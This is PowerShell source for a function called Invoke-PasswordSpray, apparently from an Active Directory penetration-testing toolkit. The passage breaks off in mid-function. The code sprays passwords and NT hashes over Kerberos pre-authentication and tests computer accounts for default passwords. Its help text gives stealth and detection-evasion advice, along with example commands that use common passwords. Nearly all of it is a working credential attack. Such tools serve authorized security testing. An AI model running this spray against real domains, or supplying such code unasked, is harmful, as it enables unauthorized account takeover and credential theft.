function Invoke-PasswordSpray {
<#
.SYNOPSIS
    Performs Kerberos-based password or NT-Hash spray attack against Active Directory.

.DESCRIPTION
    Tests a single password (or multiple passwords) against a list of usernames using
    Kerberos Pre-Authentication (AS-REQ). This avoids LDAP binds and is stealthier.

    Instead of a password, an NT hash can be sprayed (-NTHash / -NTHashList): the hash is
    the account's RC4-HMAC key, so it is tested exactly like a password, without being
    cracked first (Overpass-the-Hash). An AES key cannot be sprayed - it is salted with
    the account name and only ever valid for one account.

    A wrong NT hash is a failed logon like a wrong password and counts against the
    lockout threshold the same way.

    KDC_ERR_ETYPE_NOSUPP on an RC4 attempt has two readings. A KDC may have checked the RC4
    timestamp against the stored NT hash, found it right, and refused only to answer in
    RC4 - then the hash and the password behind it are right, there is just no Kerberos
    ticket, and NTLM may still accept the hash. Or the KDC refuses RC4 for the account
    whatever the key: measured in a lab for a Protected Users member, which answers
    KDC_ERR_ETYPE_NOSUPP to a wrong hash exactly as to the right one.

    Two steps keep the second from passing for the first. Before the first hash every
    account is asked once whether the KDC accepts RC4-HMAC for it - an AS-REQ without
    pre-authentication, which is no logon attempt and sends no hash; the Protected Users
    member is refused there and left out, and when all accounts are, the run stops and says
    so. An attempt that is still answered with KDC_ERR_ETYPE_NOSUPP is then confirmed with
    a hash that is certainly wrong: KDC_ERR_PREAUTH_FAILED for that one proves the KDC
    checks the key, and the sprayed hash is reported as a valid hash - in yellow, apart from
    the full successes. The same answer again leaves it "not tested". The confirmation is a
    failed logon; in auto mode it is left out where it would leave the account one attempt
    from lockout.

    An account whose secret was found gets no further secrets: it has one password, and
    every further attempt would only count against its lockout threshold. In a password
    spray, an attempt the KDC refuses AES256 for (an account without AES keys) is counted
    as "not tested" - there the KDC has no key to check against.

    Uses sequential testing to avoid account lockouts. Each user is tested only once
    per password, spreading attempts over time to stay under lockout thresholds.

.PARAMETER UserList
    The accounts to spray: a file with one name per line, an array of names, or a string
    with one name or several separated by commas ("jdoe" or "jdoe,asmith"). A string is read
    as a file when a file of that name exists; one that ends like a list file (.txt, .lst,
    .list, .csv) and does not exist is reported as missing rather than sprayed as a name.
    Usernames can be in format: username, DOMAIN\username, or username@domain.com

.PARAMETER Auto
    Automatically fetch all enabled users from the current adPEAS session.
    Requires an active LDAP connection via Connect-adPEAS.

    Auto mode includes intelligent lockout protection:
    - Reads the lockout policy off the domain object (threshold, observation window,
      duration)
    - Checks badPwdCount for each user
    - Skips users with badPwdCount >= (threshold - 1) to prevent lockouts
    - Displays skipped users with current bad password count
    - Only tests users with safe remaining attempts

    If the lockout policy cannot be read, auto mode stops rather than spraying blind.
    See -Force.

.PARAMETER Force
    Continue in auto mode even when the domain lockout policy could not be read.

    Without it, an unreadable policy aborts the run: the badPwdCount protection needs the
    threshold, and spraying without it can lock out every account in the domain. A domain
    that genuinely has no lockout policy is a different case and does not need -Force -
    there is nothing to lock out, and the run proceeds against all enabled users.

.PARAMETER Password
    Single password to test against all users.

.PARAMETER PasswordList
    Path to file containing passwords (one per line) or array of passwords.
    WARNING: Testing multiple passwords increases lockout risk!

.PARAMETER NTHash
    Single NT hash to test against all users (32 hex characters).

.PARAMETER NTHashList
    Path to file containing NT hashes (one per line) or array of NT hashes.
    Every entry must be 32 hex characters; a malformed entry stops the run before the
    first attempt. WARNING: like a password list, every hash is one more failed logon
    per account.

    Exactly one of -Password, -PasswordList, -NTHash, -NTHashList and -ComputerDefault is
    required.

.PARAMETER ComputerDefault
    Tests computer accounts for the default password of a pre-Windows 2000 computer: the
    computer name in lowercase, without "$", cut to 14 characters - what ADUC with
    "Assign this computer account as a pre-Windows 2000 computer" and "net computer /add"
    set. The password is derived per account, so there is no list to give, and every
    account gets exactly one attempt.

    With -Auto the accounts are the ones Get-ComputerInitialPassword reports as
    "Unchanged" (in use or never used) - the same selection, Get-ComputerInitialPasswordCandidate
    - with the same lockout protection as for users. With -UserList the names given; a
    missing "$" is added.

    The accounts that never had a password set ("dsadd computer") are not tested: they have
    no Kerberos keys, and the empty password they accept works over NTLM only, which this
    spray does not use. Auto mode names their count.

    Side effects, measured in a lab: a hit issues a TGT and sets logonCount, lastLogon and
    lastLogonTimestamp - the account then reads "in use" in Get-ComputerInitialPassword; a
    miss raises badPwdCount and logs event 4771.

.PARAMETER Domain
    Target domain FQDN (optional, uses current domain from session if not specified)

.PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

.PARAMETER Credential
    PSCredential object for authentication (optional, uses current user/session if not specified)

.PARAMETER Delay
    Delay in milliseconds between each attempt. Default: 0 (no delay).
    Use for stealth (e.g., -Delay 100) or when testing multiple passwords.

.PARAMETER StopOnSuccess
    Stop testing as soon as first valid credential is found.

.PARAMETER OutputFile
    Export successful credentials to file (format: username:password, or username:nthash
    for an NT-Hash spray).

.PARAMETER Jitter
    Add random jitter to delay (percentage). Example: -Delay 100 -Jitter 20 means 80-120ms.

.OUTPUTS
    PSCustomObject array with successful credentials:
    - Username
    - Password (password spray) or NTHash (NT-Hash spray)
    - Domain
    - Timestamp
    - Method
    - RC4Refused (NT-Hash spray): $true for a valid hash the KDC issued no RC4 ticket for

.EXAMPLE
    # Basic password spray with single password
    Invoke-PasswordSpray -UserList users.txt -Password "Winter2024!" -Domain "contoso.com"

.EXAMPLE
    # Using existing session (Domain parameter optional)
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -UserList users.txt -Password "Winter2024!"

.EXAMPLE
    # Auto mode - fetch all enabled users with lockout protection
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -Auto -Password "Winter2024!"

    Output:
    [*] Auto mode: Reading domain lockout policy...
    [*] Lockout Policy:
        Threshold:          5 bad attempts
        Observation Window: 30 minutes
        Lockout Duration:   30 minutes

    [*] Fetching all enabled users from domain...
    [+] Found 523 enabled users
    [*] Checking badPwdCount for each user (lockout protection)...

    [!] WARNING: 3 users skipped due to lockout risk:
        - jdoe: 4/5 bad attempts (only 1 remaining)
        - asmith: 5/5 bad attempts (only 0 remaining)
        - bwilson: 4/5 bad attempts (only 1 remaining)

    [+] Safe to test: 520 enabled users (skipped: 3)

.EXAMPLE
    # Password spray with delay for stealth
    Invoke-PasswordSpray -UserList users.txt -Password "Summer2024!" -Domain "contoso.com" -Delay 100

.EXAMPLE
    # Test multiple passwords (higher lockout risk!)
    Invoke-PasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain "contoso.com" -Delay 1000

.EXAMPLE
    # NT-Hash spray - test one known hash (e.g. a reused local administrator password)
    # against every enabled account, with the same lockout protection
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -Auto -NTHash "32ED87BDB5FDC5E9CBA88547376818D4"

.EXAMPLE
    # Several NT hashes from a file (one per line)
    Invoke-PasswordSpray -UserList users.txt -NTHashList hashes.txt -Domain "contoso.com" -Delay 1000

.EXAMPLE
    # Computer accounts created in advance, tested for their default password
    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
    Invoke-PasswordSpray -Auto -ComputerDefault

.EXAMPLE
    # Named computer accounts only ("$" is added where missing)
    Invoke-PasswordSpray -UserList 'WS-STAGED01','WS-STAGED02$' -ComputerDefault -Domain "contoso.com"

.EXAMPLE
    # Spray and export results
    $creds = Invoke-PasswordSpray -UserList users.txt -Password "P@ssw0rd" -Domain "contoso.com"
    $creds | Export-Csv -Path valid_creds.csv -NoTypeInformation

.EXAMPLE
    # User-as-pass spray (username = password)
    Get-Content users.txt | ForEach-Object {
        Invoke-PasswordSpray -UserList $_ -Password $_ -Domain "contoso.com"
    }

.NOTES
    Author: Alexander Sturz (@_61106960_)

    WARNING: Password spraying can cause account lockouts if not used carefully!
    - Use low attempt counts (1-2 passwords max)
    - Add delays between attempts when testing multiple passwords
    - Monitor for lockouts before continuing
    - Ensure you understand the target's lockout policy

    OPSEC Considerations:
    - Each attempt generates a Kerberos Pre-Auth event (4771)
    - Large bursts of failures from single IP are suspicious
    - Use -Delay parameter to spread attempts over time
    - An NT-Hash spray requests RC4-HMAC (etype 0x17), which stands out in the DC's
      4768/4771 events of a domain whose clients otherwise use AES
    - An NT-Hash spray first sends one AS-REQ per account without pre-authentication,
      offering RC4-HMAC only (the RC4 check), with no delay between them
    - A KDC_ERR_ETYPE_NOSUPP answer to an NT hash is confirmed with one more attempt with a
      random hash - one failed logon (4771) per such answer
#>
    [CmdletBinding(DefaultParameterSetName='UserList')]
    param(
        [Parameter(Mandatory=$true, Position=0, ParameterSetName='UserList')]
        [object]$UserList,

        [Parameter(Mandatory=$true, ParameterSetName='Auto')]
        [switch]$Auto,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [object]$PasswordList,

        [Parameter(Mandatory=$false)]
        [string]$NTHash,

        [Parameter(Mandatory=$false)]
        [object]$NTHashList,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [int]$Delay = 0,

        [Parameter(Mandatory=$false)]
        [int]$Jitter = 0,

        [Parameter(Mandatory=$false)]
        [switch]$StopOnSuccess,

        [Parameter(Mandatory=$false)]
        [switch]$Force,

        [Parameter(Mandatory=$false)]
        [string]$OutputFile,

        [Parameter(Mandatory=$false)]
        [switch]$ComputerDefault
    )

    begin {
        # 'return' inside begin{} ends the block, not the function - process{} and end{}
        # still run. Every abort below therefore has to say so, and both later blocks have
        # to honour it. Without this a refused run still walked into end{}, where
        # ($endTime - $startTime) failed on a $startTime that was never set, so the caller
        # got the real error followed by an op_Subtraction one.
        $abortRun = $false

        # Validate parameters - exactly one source of secrets. A password and an NT hash are
        # sprayed the same way, one AS-REQ per account and secret; they differ only in the
        # key Invoke-KerberosAuth builds the pre-authentication with.
        $secretSources = @()
        if ($Password)        { $secretSources += '-Password' }
        if ($PasswordList)    { $secretSources += '-PasswordList' }
        if ($NTHash)          { $secretSources += '-NTHash' }
        if ($NTHashList)      { $secretSources += '-NTHashList' }
        if ($ComputerDefault) { $secretSources += '-ComputerDefault' }

        if ($secretSources.Count -eq 0) {
            Write-Error "You must specify one of -Password, -PasswordList, -NTHash, -NTHashList or -ComputerDefault"
            $abortRun = $true; return
        }

        if ($secretSources.Count -gt 1) {
            Write-Error "Specify only one of -Password, -PasswordList, -NTHash, -NTHashList or -ComputerDefault - got $($secretSources -join ', ')."
            $abortRun = $true; return
        }

        # The parameter name the secret is handed to Invoke-KerberosAuth under, and the
        # words the console uses for it. A computer default password is a password, derived
        # per account (process{}).
        $secretKind = if ($NTHash -or $NTHashList) { 'NTHash' } else { 'Password' }
        $secretLabel       = if ($secretKind -eq 'NTHash') { 'NT-Hash' }   else { 'password' }
        $secretLabelPlural = if ($secretKind -eq 'NTHash') { 'NT-Hashes' } else { 'passwords' }
        # What auto mode tests, in the words of its lockout lines.
        $accountNoun = if ($ComputerDefault) { 'candidate computer accounts' } else { 'enabled users' }

        # Build connection parameters (for Ensure-LDAPConnection and Get-Domain* calls)
        $connectionParams = @{}
        if ($Domain) { $connectionParams['Domain'] = $Domain }
        if ($Server) { $connectionParams['Server'] = $Server }
        if ($Credential) { $connectionParams['Credential'] = $Credential }

        # Load usernames
        $usernames = @()

        # The lockout facts auto mode reads, for the confirmation of an NT-hash hit later
        # on (process{}). A user list brings none: 0 means "unknown, not guarded".
        $lockoutThreshold = 0
        $initialBadPwdCount = @{}

        if ($Auto) {
            # Auto mode - fetch all enabled users from current adPEAS session
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                Write-Error "Auto mode requires an active LDAP connection. Use Connect-adPEAS first."
                $abortRun = $true; return
            }

            Write-Host "[*] Auto mode: Reading domain lockout policy..." -ForegroundColor Cyan

            # Read the lockout policy off the domain object directly.
            #
            # NOT through Get-DomainPasswordPolicy: that is a check module. It hands its
            # policy object to Show-Object and returns nothing to a caller, so what this
            # code used to read from it was always $null - the threshold fell back to 0,
            # the badPwdCount protection below never ran once, and the console announced
            # "No lockout policy configured" for domains that very much had one. It also
            # rendered a whole report section, fine-grained policy scan included, into the
            # middle of the spray output.
            $lockoutThreshold    = 0
            $lockoutDurationText = 'unknown'
            $lockoutWindowText   = 'unknown'
            $lockoutPolicyRead   = $false

            $domainPolicyResults = Get-DomainObject -Identity $Script:LDAPContext.DomainDN @connectionParams
            $domainPolicy = if ($domainPolicyResults -is [array]) { $domainPolicyResults[0] } else { $domainPolicyResults }

            if ($domainPolicy) {
                $lockoutPolicyRead = $true

                if ($domainPolicy.lockoutThreshold) {
                    try { $lockoutThreshold = [int]$domainPolicy.lockoutThreshold } catch { $lockoutThreshold = 0 }
                }

                # Raw negative 100-nanosecond deltas - ConvertFrom-ADInterval knows the
                # Int64.MinValue "never" sentinel, which must not turn into a duration.
                $durationSpan = ConvertFrom-ADInterval -Value $domainPolicy.lockoutDuration
                $windowSpan   = ConvertFrom-ADInterval -Value $domainPolicy.lockOutObservationWindow

                $lockoutDurationText = if ($durationSpan -and $durationSpan.Ticks -gt 0) {
                    "$([int]$durationSpan.TotalMinutes) minutes"
                } else { 'until manually unlocked' }

                $lockoutWindowText = if ($windowSpan -and $windowSpan.Ticks -gt 0) {
                    "$([int]$windowSpan.TotalMinutes) minutes"
                } else { 'not set' }
            }

            if (-not $lockoutPolicyRead) {
                # Spraying without knowing the threshold can lock out every account in the
                # domain. Refusing is the safe default; -Force is the deliberate override.
                if (-not $Force) {
                    Write-Error "Could not read the domain lockout policy, so the lockout protection cannot run. Re-run with -Force to spray without it - this may lock out accounts."
                    $abortRun = $true; return
                }
                Write-Warning "Could not read the domain lockout policy. Continuing because -Force was given - accounts may be locked out."
            }

            Write-Host "[*] Lockout Policy:" -ForegroundColor Cyan
            if ($lockoutPolicyRead) {
                if ($lockoutThreshold -gt 0) {
                    Write-Host "    Threshold:          $lockoutThreshold bad attempts" -ForegroundColor Green
                } else {
                    Write-Host "    Threshold:          no lockout configured" -ForegroundColor Yellow
                }
                Write-Host "    Observation Window: $lockoutWindowText"
                Write-Host "    Lockout Duration:   $lockoutDurationText"
            } else {
                Write-Host "    Unknown - the policy could not be read" -ForegroundColor Red
            }
            Write-Host ""

            if ($ComputerDefault) {
                # The accounts Get-ComputerInitialPassword reports, by the same selection.
                # Only the "Unchanged" ones can have the default password; the ones that never
                # had one set have no Kerberos keys, and their empty password works over NTLM
                # only, which this spray does not use.
                Write-Host "[*] Fetching computer accounts that still carry their creation password..." -ForegroundColor Cyan
                $candidates = @(Get-ComputerInitialPasswordCandidate @connectionParams)
                $noPasswordCount = @($candidates | Where-Object { $_.passwordSinceCreation -eq 'Never set - empty password' }).Count
                $enabledUsers = @($candidates | Where-Object { $_.passwordSinceCreation -like 'Unchanged*' })

                if ($noPasswordCount -gt 0) {
                    Write-Host "[*] $noPasswordCount computer account(s) never had a password set - not tested (no Kerberos keys; see Get-ComputerInitialPassword)" -ForegroundColor Yellow
                }
                if ($enabledUsers.Count -eq 0) {
                    Write-Error "No computer account whose password may still be the default"
                    $abortRun = $true; return
                }
                Write-Host "[+] Found $($enabledUsers.Count) computer account(s) whose password dates from their creation" -ForegroundColor Green
            } else {
                Write-Host "[*] Fetching all enabled users from domain..." -ForegroundColor Cyan

                # Get all enabled users with badPwdCount attribute
                $enabledUsers = Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" @connectionParams

                if (-not $enabledUsers) {
                    Write-Error "No enabled users found in domain"
                    $abortRun = $true; return
                }

                Write-Host "[+] Found $($enabledUsers.Count) enabled users" -ForegroundColor Green
            }

            # Filter users based on lockout threshold
            $skippedUsers = @()
            $safeUsers = @()

            if ($lockoutThreshold -gt 0) {
                Write-Host "[*] Checking badPwdCount for each user (lockout protection)..." -ForegroundColor Cyan

                foreach ($user in $enabledUsers) {
                    $badPwdCount = 0
                    if ($user.badPwdCount) {
                        $badPwdCount = [int]$user.badPwdCount
                    }

                    # Calculate safety margin: Skip if user is 1 attempt away from lockout
                    $remainingAttempts = $lockoutThreshold - $badPwdCount

                    if ($remainingAttempts -le 1) {
                        $skippedUsers += [PSCustomObject]@{
                            Username = $user.sAMAccountName
                            BadPwdCount = $badPwdCount
                            RemainingAttempts = $remainingAttempts
                        }
                    } else {
                        $safeUsers += $user.sAMAccountName
                        $initialBadPwdCount[[string]$user.sAMAccountName] = $badPwdCount
                    }
                }

                if ($skippedUsers.Count -gt 0) {
                    Write-Host ""
                    Write-Host "[!] WARNING: $($skippedUsers.Count) users skipped due to lockout risk:" -ForegroundColor Yellow
                    foreach ($skipped in $skippedUsers) {
                        Write-Host "    - $($skipped.Username): $($skipped.BadPwdCount)/$lockoutThreshold bad attempts (only $($skipped.RemainingAttempts) remaining)" -ForegroundColor Yellow
                    }
                    Write-Host ""
                }

                $usernames = $safeUsers

                if ($usernames.Count -eq 0) {
                    Write-Error "No safe users to test - all accounts are close to lockout threshold"
                    $abortRun = $true; return
                }

                Write-Host "[+] Safe to test: $($usernames.Count) $accountNoun (skipped: $($skippedUsers.Count))" -ForegroundColor Green
                Write-Host ""

            } else {
                # Threshold 0. Two very different reasons end up here, and the operator has
                # to be able to tell them apart: the domain really has no lockout policy
                # (spraying cannot lock anything), or the policy could not be read and the
                # run continues only because -Force was given.
                if ($lockoutPolicyRead) {
                    Write-Host "[*] Domain has no lockout policy configured - testing all $accountNoun" -ForegroundColor Yellow
                } else {
                    Write-Host "[!] Lockout policy unknown - testing all $accountNoun WITHOUT lockout protection" -ForegroundColor Red
                }
                Write-Host ""
                $usernames = $enabledUsers | ForEach-Object { $_.sAMAccountName }
            }

        } elseif ($UserList -is [string]) {
            # A string is a file when one exists under that name, and the account names
            # themselves otherwise - one, or several separated by commas. It used to be a file
            # path and nothing else, so "-UserList jdoe", a quoted "a,b" and Get-Content of a
            # one-line file all ended in "User list file not found", and the user-as-pass
            # example in the help never ran. A string that looks like a list file is still
            # reported as missing: a typo in the file name must not be sprayed as an account.
            if (Test-Path -LiteralPath $UserList -PathType Leaf) {
                $usernames = Get-Content -LiteralPath $UserList | Where-Object { $_ -and $_.Trim() }
            } elseif ($UserList -match '\.(txt|lst|list|csv)\s*$') {
                Write-Error "User list file not found: $UserList"
                $abortRun = $true; return
            } else {
                $usernames = @($UserList -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
            }
        } elseif ($UserList -is [array]) {
            $usernames = $UserList
        } else {
            # Single username
            $usernames = @($UserList)
        }

        # Load the secrets - passwords or NT hashes. -ComputerDefault has one per account,
        # derived in process{}; the single entry here only stands for it, so the loop there
        # runs once.
        $secrets = @()
        if ($ComputerDefault) {
            $secrets = @('(computer name in lowercase)')
        } elseif ($Password) {
            $secrets = @($Password)
        } elseif ($NTHash) {
            $secrets = @($NTHash)
        } else {
            $secretList     = if ($secretKind -eq 'NTHash') { $NTHashList } else { $PasswordList }
            $secretListName = if ($secretKind -eq 'NTHash') { 'NT-Hash' }   else { 'Password' }

            if ($secretList -is [string]) {
                if (Test-Path $secretList) {
                    $secrets = Get-Content -Path $secretList | Where-Object { $_ -and $_.Trim() }
                } else {
                    Write-Error "$secretListName list file not found: $secretList"
                    $abortRun = $true; return
                }
            } elseif ($secretList -is [array]) {
                $secrets = $secretList
            }
        }

        if ($secretKind -eq 'NTHash') {
            # A hash is hex, so whitespace around it is never part of it (around a password
            # it can be - passwords are not trimmed). Every entry is checked before the first
            # attempt: Invoke-KerberosAuth rejects a malformed hash at parameter binding,
            # which would end the run in the middle, after the entries before it had already
            # been sprayed.
            $secrets = @($secrets | ForEach-Object { ([string]$_).Trim() } | Where-Object { $_ })
            for ($i = 0; $i -lt $secrets.Count; $i++) {
                if ($secrets[$i] -notmatch '^[0-9a-fA-F]{32}$') {
                    Write-Error "NT-Hash entry $($i + 1) is not an NT hash (expected 32 hex characters, got $($secrets[$i].Length)): $($secrets[$i])"
                    $abortRun = $true; return
                }
            }
        }

        # DOMAIN\user and user@domain name the same account as user. Normalized once, here,
        # because the RC4 check below needs the bare name before the first attempt.
        # Surrounding whitespace is never part of an account name - a line "jdoe " in a file
        # would otherwise be sprayed as an account that does not exist.
        $usernames = @($usernames | ForEach-Object {
            $accountName = ([string]$_).Trim()
            if ($accountName -match '\\') { $accountName.Split('\')[1] }
            elseif ($accountName -match '@') { $accountName.Split('@')[0] }
            else { $accountName }
        } | Where-Object { $_ })

        # A computer account's sAMAccountName ends in "$"; a name given without it is meant
        # with it - "WS-STAGED01" is the account WS-STAGED01$.
        if ($ComputerDefault) {
            $usernames = @($usernames | ForEach-Object { if ($_.EndsWith('$')) { $_ } else { "$_`$" } })
        }

        if ($usernames.Count -eq 0) {
            Write-Error "No usernames to test"
            $abortRun = $true; return
        }

        if (@($secrets).Count -eq 0) {
            Write-Error "No $secretLabelPlural to test"
            $abortRun = $true; return
        }
        $secrets = @($secrets)

        # Get Domain from session if not specified.
        #
        # The key is Domain. DomainDNS is written nowhere in the project, so this read
        # answered $null and the guard below refused the run with "No domain specified and
        # no active session" - on a session that was perfectly alive. Spraying off an
        # established session, which is what the help describes, never worked.
        $targetDomain = $Domain
        if (-not $targetDomain -and $Script:LDAPContext) {
            $targetDomain = $Script:LDAPContext.Domain
        }

        if (-not $targetDomain) {
            Write-Error "No domain specified and no active session. Use -Domain parameter or Connect-adPEAS first."
            $abortRun = $true; return
        }

        # NT-Hash spray: does the KDC refuse RC4-HMAC for an account whatever the key? Asked
        # once per account before the first hash, with an AS-REQ that carries no
        # pre-authentication (Invoke-KerberosAuth -ETypeProbe) - no hash leaves this host and
        # nothing counts against the lockout threshold.
        #
        # An account refused here, before any key, refuses every hash the same way, so a
        # refusal of an attempt would say nothing about the hash - it is left out rather than
        # reported. Measured in a lab: a Protected Users member is refused here, and answers
        # KDC_ERR_ETYPE_NOSUPP to a wrong hash as to the right one. A refusal that reaches an
        # attempt anyway is confirmed there (process{}).
        $rc4RefusedCount = 0
        if ($secretKind -eq 'NTHash') {
            Write-Host "[*] Checking whether the KDC accepts RC4-HMAC for these accounts (no logon attempt)..." -ForegroundColor Cyan
            $rc4Accepted = @()
            foreach ($username in $usernames) {
                $probeParams = @{
                    UserName    = $username
                    Domain      = $targetDomain
                    NTHash      = $secrets[0]
                    ETypeProbe  = $true
                    ErrorAction = 'SilentlyContinue'
                }
                if ($Server) { $probeParams['DomainController'] = $Server }

                $probe = $null
                try { $probe = Invoke-KerberosAuth @probeParams } catch {
                    Write-Verbose "[-] RC4 check failed for ${username}@${targetDomain}: $_"
                }

                # Only an explicit refusal leaves an account out. An answer that decides
                # nothing - unknown account, revoked, a network error - keeps it, and the
                # attempt itself tells.
                if ($probe -and $probe.ETypeAccepted -eq $false) {
                    $rc4RefusedCount++
                    Write-Verbose "[-] RC4-HMAC refused: ${username}@${targetDomain} - $($probe.Error)"
                } else {
                    $rc4Accepted += $username
                }
            }

            if ($rc4Accepted.Count -eq 0) {
                Write-Host "[!] The KDC refuses RC4-HMAC for all $rc4RefusedCount account(s) - an NT hash cannot be tested here (KDC_ERR_ETYPE_NOSUPP)" -ForegroundColor Red
                $abortRun = $true; return
            }
            if ($rc4RefusedCount -gt 0) {
                Write-Host "[!] The KDC refuses RC4-HMAC for $rc4RefusedCount of $($usernames.Count) account(s) - they are left out" -ForegroundColor Yellow
            }
            Write-Host ""
            $usernames = $rc4Accepted
        }

        # Warn about lockout risk
        if ($secrets.Count -gt 1 -and $Delay -lt 500) {
            Write-Warning "Testing multiple $secretLabelPlural with low/no delay increases lockout risk!"
            Write-Warning "Consider using -Delay 1000 or higher when testing multiple $secretLabelPlural."
        }

        Write-Host "[*] Password Spray Configuration:" -ForegroundColor Cyan
        Write-Host "    Domain:          $targetDomain"
        if ($Server) {
            Write-Host "    DC:              $Server"
        }
        $usersLine = "    Users:           $($usernames.Count)"
        if ($rc4RefusedCount -gt 0) { $usersLine += " ($rc4RefusedCount left out - KDC refused RC4)" }
        Write-Host $usersLine
        if ($secretKind -eq 'NTHash') {
            Write-Host "    NT-Hashes:       $($secrets.Count) (RC4-HMAC)"
        } elseif ($ComputerDefault) {
            Write-Host "    Passwords:       computer name in lowercase, one per account"
        } else {
            Write-Host "    Passwords:       $($secrets.Count)"
        }
        Write-Host "    Total Attempts:  $($usernames.Count * $secrets.Count)"
        Write-Host "    Delay:           ${Delay}ms" -NoNewline
        if ($Jitter -gt 0) {
            Write-Host " (+/- ${Jitter}%)" -ForegroundColor Yellow
        } else {
            Write-Host ""
        }
        Write-Host ""

        $successfulCreds = @()
        $totalAttempts = 0
        $successCount = 0
        $notTestedCount = 0
        # NT-hash hits the KDC answered with KDC_ERR_ETYPE_NOSUPP and a wrong hash with
        # KDC_ERR_PREAUTH_FAILED: the hash is right, RC4 is refused for the answer - process{}
        $rc4RefusedValidCount = 0
        # Accounts done with before the last secret: their secret was found, or the KDC
        # refuses the encryption type for them whatever the key.
        $finishedAccounts = @{}
        # KDC_ERR_PREAUTH_FAILED answers this run caused, per account - what the lockout
        # guard of the confirmation adds to the badPwdCount auto mode read.
        $runFailures = @{}

        # A hash that is certainly not the account's: 16 random bytes. For the confirmation
        # of a KDC_ERR_ETYPE_NOSUPP answer only.
        function New-UnrelatedNTHash {
            $randomBytes = New-Object byte[] 16
            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
            try { $rng.GetBytes($randomBytes) } finally { $rng.Dispose() }
            ($randomBytes | ForEach-Object { $_.ToString('X2') }) -join ''
        }
        $startTime = Get-Date
    }

    process {
        if ($abortRun) { return }

        # Test each secret against all users
        foreach ($secret in $secrets) {
            # Every account is finished - its secret found, or it refused the encryption
            # type: the rest would not be sent anywhere.
            if (@($usernames | Where-Object { -not $finishedAccounts.ContainsKey($_) }).Count -eq 0) { break }

            if ($secrets.Count -gt 1) {
                Write-Host "[*] Testing ${secretLabel}: $secret" -ForegroundColor Cyan
            }

            $attemptNum = 0
            foreach ($username in $usernames) {
                # Finished with an earlier secret: an account has one password, so every
                # further attempt would only be a failed logon against its lockout counter.
                if ($finishedAccounts.ContainsKey($username)) { continue }

                $attemptNum++
                $totalAttempts++

                # Already the bare account name - normalized in begin{}
                $cleanUsername = $username

                # -ComputerDefault: the password is the account's own - its name in
                # lowercase. Set here, so the attempt, the hit, the output file and the
                # verbose lines all carry the one that was tried.
                if ($ComputerDefault) { $secret = Get-ComputerDefaultPassword -SamAccountName $username }

                # Progress indicator every 50 attempts
                if ($attemptNum % 50 -eq 0) {
                    $percent = [math]::Round(($attemptNum / $usernames.Count) * 100)
                    Write-Host "    Progress: $attemptNum/$($usernames.Count) ($percent%)" -ForegroundColor Gray
                }

                # Test credential via Kerberos Pre-Auth. The request is the same either way:
                # a password becomes an AES256 key with the account's salt, an NT hash is
                # the RC4-HMAC key itself (Overpass-the-Hash).
                $kerberosParams = @{
                    UserName = $cleanUsername
                    Domain = $targetDomain
                    ErrorAction = 'SilentlyContinue'
                }
                $kerberosParams[$secretKind] = $secret
                if ($Server) { $kerberosParams['DomainController'] = $Server }

                $result = Invoke-KerberosAuth @kerberosParams

                # KDC_ERR_ETYPE_NOSUPP (14) on a pre-authenticated NT-hash attempt has two
                # readings that the answer alone cannot tell apart:
                # - the KDC checked the RC4 timestamp against the stored NT hash, found it
                #   right, and refused only to answer in RC4 - a hit without a ticket, whose
                #   password is right and which NTLM may still accept;
                # - the KDC refuses RC4 for the account whatever the key. Measured in a lab
                #   for a Protected Users member: 14 for the wrong hash as for the right one.
                # The RC4 check before the spray left out the accounts refused even without a
                # pre-authentication - the Protected Users member was among them. Whatever
                # reaches this point is confirmed with a hash that is certainly wrong:
                # KDC_ERR_PREAUTH_FAILED for that one proves the KDC checks the key, so the
                # sprayed hash is right; 14 again means the answer says nothing.
                #
                # The confirmation is a failed logon. In auto mode, where the threshold and
                # the badPwdCount are known, it is left out where it would leave the account
                # one attempt from lockout - and the attempt then counts as not tested.
                #
                # Literal 14 and 24, not the $Script:KDC_ERR_* constants: where those are not
                # defined the comparison is ErrorCode -eq $null, which is true for every
                # failure without a KDC error code.
                $hashValidRC4Refused = $false
                if ($secretKind -eq 'NTHash' -and $result.ErrorCode -eq 14) {
                    $confirmSafe = $true
                    if ($lockoutThreshold -gt 0) {
                        $badSoFar = [int]$runFailures[$username]
                        if ($initialBadPwdCount.ContainsKey($username)) { $badSoFar += [int]$initialBadPwdCount[$username] }
                        if (($lockoutThreshold - $badSoFar) -le 1) { $confirmSafe = $false }
                    }

                    if ($confirmSafe) {
                        $confirmParams = $kerberosParams.Clone()
                        $confirmParams['NTHash'] = New-UnrelatedNTHash
                        $confirmation = Invoke-KerberosAuth @confirmParams
                        if ($confirmation.ErrorCode -eq 24) {
                            $runFailures[$username] = [int]$runFailures[$username] + 1
                            $hashValidRC4Refused = $true
                        } else {
                            Write-Verbose "[-] ${cleanUsername}@${targetDomain}: a wrong hash got the same answer ($($confirmation.Error)) - the KDC refuses RC4 whatever the key"
                        }
                    } else {
                        Write-Verbose "[-] ${cleanUsername}@${targetDomain}: KDC refused RC4 - not confirmed, a wrong hash would leave the account one attempt from lockout"
                    }
                }

                if ($result.Success -or $hashValidRC4Refused) {
                    if ($result.Success) { $successCount++ } else { $rc4RefusedValidCount++ }
                    $finishedAccounts[$username] = $true

                    $timestamp = Format-adPEASTime (Get-Date)
                    $credInfo = if ($secretKind -eq 'NTHash') {
                        [PSCustomObject]@{
                            Username   = $cleanUsername
                            NTHash     = $secret
                            Domain     = $targetDomain
                            Timestamp  = $timestamp
